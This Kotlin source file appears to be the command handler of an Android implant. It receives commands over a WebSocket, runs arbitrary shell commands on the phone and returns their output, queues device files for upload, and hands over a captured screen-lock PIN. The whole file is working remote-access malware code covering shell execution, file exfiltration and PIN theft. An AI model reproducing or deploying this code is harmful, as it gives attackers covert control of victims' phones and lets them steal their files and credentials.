package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import com.cooperthecoder.implant.data.UploadQueue
import okhttp3.WebSocket
import java.io.BufferedReader
import java.io.InputStreamReader

class CommandHandler(context: Context, val command: Command, val socket: WebSocket) {

    val context: Context = context.applicationContext

    object Commands {
        const val EXECUTE = "execute"
        const val REPLY = "reply"
        const val UPLOAD = "upload"
        const val PIN = "pin"
    }

    fun handle() {
        when (command.command) {
            Commands.EXECUTE -> {
                val shellCommand = command.arguments["shell_command"]
                if (shellCommand != null) {
                    handleExecute(shellCommand)
                } else {
                    reply("", "Required argument: shell_command")
                }
            }

            Commands.UPLOAD -> {
                val filename = command.arguments["filename"]
                if (filename != null) {
                    handleUpload(filename)
                } else {
                    reply("", "Required argument: filename")
                }
            }

            Commands.PIN -> {
                val pin = SharedPreferencesQuery.getNextPin(context)
                if (pin != null) {
                    handlePin(pin)
                } else {
                    reply("", "No PIN recorded yet")
                }
            }
        }
    }

    private fun handleExecute(shellCommand: String) {
        Log.d(CommandListener.TAG, "Executing: $shellCommand")
        val process = try {
            Runtime.getRuntime().exec(shellCommand)
        } catch (e: Exception) {
            Log.e(CommandListener.TAG, "Error running command", e)
            return
        }
        process.waitFor()

        val outputReader = BufferedReader(InputStreamReader(process.inputStream))
        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
        val outputBuilder = StringBuilder()
        val errorBuilder = StringBuilder()
        outputReader.forEachLine {
            outputBuilder.append(it)
        }
        errorReader.forEachLine {
            errorBuilder.append(it)
        }

        val output = outputBuilder.toString()
        val error = errorBuilder.toString()
        reply(output, error)
    }

    private fun handlePin(pin: String) {
        reply(pin, "")
    }

    private fun handleUpload(filename: String) {
        try {
            UploadQueue.push(filename)
        } catch (e: Exception) {
            reply("", "Error: ${e.message}")
            return
        }

        reply("$filename queued for upload.", "")
    }

    private fun reply(output: String, error: String) {
        val arguments = hashMapOf(
                "nonce" to command.nonce,
                "output" to output,
                "error" to error
        )
        val command = Command.Builder()
                .command(Commands.REPLY)
                .arguments(arguments)
                .build()

        socket.send(command.json())
    }
}